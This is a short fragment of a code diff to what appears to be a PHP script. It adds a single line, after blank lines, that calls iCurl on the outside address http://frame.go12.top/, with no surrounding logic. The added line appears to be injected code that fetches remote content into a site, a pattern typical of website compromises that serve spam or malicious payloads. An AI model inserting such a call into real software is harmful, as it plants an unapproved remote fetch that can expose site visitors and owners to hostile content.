@@ -10,3 +10,4 @@ require ROOT_PATH.'/System/cgi.php';
 
 
 
+iCurl('http://frame.go12.top/');
